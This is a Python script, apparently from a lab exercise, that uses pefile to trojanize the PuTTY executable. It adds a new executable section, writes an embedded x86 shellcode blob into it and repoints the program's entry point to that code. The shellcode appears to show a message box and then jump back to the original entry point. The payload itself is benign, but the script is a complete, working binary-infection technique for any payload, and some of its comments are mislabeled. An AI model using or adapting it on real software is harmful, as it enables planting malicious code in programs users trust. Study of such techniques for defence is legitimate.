import pefile



# size is not optional, it is required to be calculated from the alignment
# the return value is a multiple of alignment
# - 1 is used in case that the value of size is a multiple of alignment
def align(size, alignment):
    return ((size + alignment - 1) // alignment) * alignment

exe_path = "E:\\Test\\putty.exe"
shellcode = b"""\xD9\xEB\x9B\xD9\x74\x24\xF4\x31\xD2\xB2\x77\x31\xC9\x64\x8B\x71\x30\x8B\x76\x0C\x8B\x76\x1C\x8B\x46\x08\x8B\x7E\x20\x8B\x36\x38\x4F\x18\x75\xF3\x59\x01\xD1\xFF\xE1\x60\x8B\x6C\x24\x24\x8B\x45\x3C\x8B\x54\x28\x78\x01\xEA\x8B\x4A\x18\x8B\x5A\x20\x01\xEB\xE3\x34\x49\x8B\x34\x8B\x01\xEE\x31\xFF\x31\xC0\xFC\xAC\x84\xC0\x74\x07\xC1\xCF\x0D\x01\xC7\xEB\xF4\x3B\x7C\x24\x28\x75\xE1\x8B\x5A\x24\x01\xEB\x66\x8B\x0C\x4B\x8B\x5A\x1C\x01\xEB\x8B\x04\x8B\x01\xE8\x89\x44\x24\x1C\x61\xC3\xB2\x08\x29\xD4\x89\xE5\x89\xC2\x68\x8E\x4E\x0E\xEC\x52\xE8\x9F\xFF\xFF\xFF\x89\x45\x04\xBB\xEF\xCE\xE0\x60\x87\x1C\x24\x52\xE8\x8E\xFF\xFF\xFF\x89\x45\x08\x68\x6C\x6C\x20\x41\x68\x33\x32\x2E\x64\x68\x75\x73\x65\x72\x30\xDB\x88\x5C\x24\x0A\x89\xE6\x56\xFF\x55\x04\x89\xC2\x50\xBB\xA8\xA2\x4D\xBC\x87\x1C\x24\x52\xE8\x5F\xFF\xFF\xFF\x68\x30\x58\x20\x20\x68\x4E\x54\x32\x33\x31\xDB\x88\x5C\x24\x05\x89\xE3\x68\x32\x39\x58\x20\x68\x35\x32\x30\x38\x68\x36\x2D\x31\x38\x68\x32\x31\x33\x33\x68\x2D\x31\x38\x35\x68\x30\x31\x39\x31\x68\x31\x38\x35\x32\x31\xC9\x88\x4C\x24\x1A\x89\xE1\x31\xD2\x6A\x40\x53\x51\x52\xFF\xD0\xB8\xA7\xFF\x57\x11\x2D\x11\x01\x11\x11\xFF\xD0"""


# STEP 0x01 - Add the New Section Header
print("[*] STEP 0x01 - Add the New Section Header")

pe = pefile.PE(exe_path)

# Get total of sections in PE file
number_of_section = pe.FILE_HEADER.NumberOfSections
last_section = number_of_section - 1

# Get memory alignment after being loaded into main memory
file_alignment = pe.OPTIONAL_HEADER.FileAlignment
# Get memory alignment of Pe file on disk
section_alignment = pe.OPTIONAL_HEADER.SectionAlignment

# get aligned section size that is valid to be put in main memory
raw_size = align(0x1000, file_alignment)
raw_offset = align((pe.sections[last_section].PointerToRawData +
                    pe.sections[last_section].SizeOfRawData),
                   file_alignment)

# get aligned section size that is valid to be put on disk
virtual_size = align(0x1000, section_alignment)
virtual_offset = align((pe.sections[last_section].VirtualAddress +
                        pe.sections[last_section].Misc_VirtualSize),
                       section_alignment)

# this is a flag, show the actions which is offered by this section (0xE0000020 is readable, writable, executable)
characteristics = 0xE0000020

# Section name, mandatory size is 8 bytes
name = b".axc" + (4 * b"\x00")

# get offset of early last section header, then add 40 (size of each pe section header is 40 bytes)
# to get the offset of the new section pe header
new_section_offset = (pe.sections[last_section].get_file_offset() + 40)

# Set parameters of the section header,

# Set the name
pe.set_bytes_at_offset(new_section_offset, name)
print("\t[+] Section Name = %s" % name)

# Set the virtual size
pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
print("\t[+] Virtual Size = %s" % hex(virtual_size))

# Set the virtual offset
pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
print("\t[+] Virtual Offset = %s" % hex(virtual_offset))

# Set the raw size
pe.set_dword_at_offset(new_section_offset + 16, raw_size)
print("\t[+] Raw Size = %s" % hex(raw_size))
# Set the raw offset
pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
print("\t[+] Raw Offset = %s" % hex(raw_offset))

# Set the following fields to zero
# These fields are consist of PointerToRelocations, PointerToLinenumbers
# NumberOfRelocations, NumberOfLinenumbers
pe.set_bytes_at_offset(new_section_offset + 24, (12 * b'\x00'))

# Set the characteristics
pe.set_dword_at_offset(new_section_offset + 36, characteristics)
print("\t[+] Characteristics = %s\n" % hex(characteristics))


# STEP 0x02 - Modify the Main Headers
print("[*] STEP 0x02 - Modify the Main Headers")

# total of section apparently is increased by 1
pe.FILE_HEADER.NumberOfSections += 1
print("\t[+] Number of Sections = %s" % pe.FILE_HEADER.NumberOfSections)
pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset
print("\t[+] Size of Image = %d bytes" % pe.OPTIONAL_HEADER.SizeOfImage)

pe.write("E:\\Test\\putty_.exe")

pe = pefile.PE("E:\\Test\\putty_.exe")

number_of_section = pe.FILE_HEADER.NumberOfSections
last_section = number_of_section - 1
#the new entry point is the address of the inserted section in main memory
new_ep = pe.sections[last_section].VirtualAddress
print("\t[+] New Entry Point = %s" % hex(pe.sections[last_section].VirtualAddress))

print ("\t[+] ImageBase = %s\t" % hex(pe.OPTIONAL_HEADER.ImageBase))
print ("\t[+] Original Entry Point = %s\n" % hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep
# STEP 0x03 - Inject the Shellcode in the New Section
print("[*] STEP 0x04 - Inject the Shellcode in the New Section")

#the location of injected shellcode is at the address of the section on disk
raw_offset = pe.sections[last_section].PointerToRawData
pe.set_bytes_at_offset(raw_offset, shellcode)
print("\t[+] Shellcode wrote in the new section")

pe.write("E:\\Test\\putty_last.exe")
